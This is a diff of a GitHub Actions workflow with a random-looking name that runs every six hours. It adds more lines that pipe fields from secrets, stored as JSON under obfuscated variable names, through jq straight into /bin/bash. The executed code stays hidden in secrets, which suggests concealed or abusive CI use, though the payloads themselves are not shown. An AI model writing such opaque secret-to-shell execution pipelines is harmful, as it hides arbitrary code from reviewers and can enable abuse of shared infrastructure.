@@ -2,8 +2,9 @@ name: huangxuexiao1960
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 0/6 * * *'
-jobs:  # 26041
+    - cron: '58 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,11 +12,19 @@ jobs:  # 26041
       - uses: actions/checkout@v4
       - name: huangxuexiao1960
         env:
-          pma4006: ${{ secrets.pma4006 }}
+          p3855: ${{ secrets.p3855 }}
         run: |
-          echo $pma4006 | jq -r .xm7 | /bin/bash
-          echo $bohk82261 | jq -r .ptn27264 | /bin/bash
-          echo $wymjb85157 | jq -r .ar3 | /bin/bash
-          echo $cjoo195 | jq -r .jt562 | /bin/bash
-          echo $ty58 | jq -r .pvhrw7 | /bin/bash
+          echo $p3855 | jq -r .qqvpa06 | /bin/bash
+          echo $gsurx64975 | jq -r .h3 | /bin/bash
+          echo $m836 | jq -r .riyfk22 | /bin/bash
+          echo $jy4300 | jq -r .q338 | /bin/bash
+          echo $zdpvw1 | jq -r .p63 | /bin/bash
+          echo $t7328 | jq -r .dm86 | /bin/bash
+          echo $yh81 | jq -r .ybolr0323 | /bin/bash
+          echo $lyqti57574 | jq -r .bwao286 | /bin/bash
+          echo $pe91 | jq -r .gfk81337 | /bin/bash
+          echo $hgw94148 | jq -r .lfwx1 | /bin/bash
+          echo $mc61693 | jq -r .ybjo0244 | /bin/bash
+          echo $vwuo8 | jq -r .t64 | /bin/bash
+          echo $cbj65568 | jq -r .cgter00 | /bin/bash
 
